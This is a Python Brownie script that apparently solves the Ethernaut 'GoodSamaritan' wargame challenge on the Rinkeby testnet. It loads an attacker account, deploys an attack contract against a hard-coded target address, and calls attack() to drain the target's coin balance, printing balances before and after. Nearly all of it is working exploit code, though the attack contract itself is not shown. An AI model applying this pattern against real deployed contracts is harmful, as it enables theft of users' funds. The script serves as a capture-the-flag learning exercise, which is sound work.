from ctypes import addressof
from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from brownie.convert import *
from web3 import Web3

import time
import json
import os

# for local deployment: 


# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# DEV deployment
# deployer=accounts[0]
# deployer=accounts[0]
# attacker=accounts[1]
# cryptoVault=CryptoVault.deploy('0x4070cC66609234028E079FbdC42133c32fCd5225', {'from': deployer, 'priority_fee': priority_fee})

acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0xCF3Ad96c500e30F07d29043231d5C4261Fa551c1'
goodSamaritan=interface.GoodSamaritan(target_address)

# attacker.transfer(target_ct.address, 100000000000, priority_fee=priority_fee)
attacker_ct=goodsamaritanAttack.deploy(goodSamaritan.address, {'from': attacker, 'priority_fee': priority_fee})

def main():

    print('--- values addresses ---')
    print('goodSamaritan:', goodSamaritan.address)
    print('wallet:', goodSamaritan.wallet())
    print('coin:', goodSamaritan.coin())
    print('attacker:', attacker)
    print('attacker_ct:', attacker_ct)


    wallet=interface.Wallet(goodSamaritan.wallet())
    coin=interface.Coin(goodSamaritan.coin())



    print('--- values BEFORE attack ---')
    print('balance of goodSamaritan: ', coin.balances(goodSamaritan.address))
    print('balance of wallet: ', coin.balances(goodSamaritan.wallet()))
    print('balance of attacker_ct: ', coin.balances(attacker_ct.address))


    tx=attacker_ct.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000, 'allow_revert': True})

    print('--- values AFTER attack ---')
    print('balance of goodSamaritan: ', coin.balances(goodSamaritan.address))
    print('balance of wallet: ', coin.balances(goodSamaritan.wallet()))
    print('balance of attacker_ct: ', coin.balances(attacker_ct.address))

    print('--- It is over ---')
    
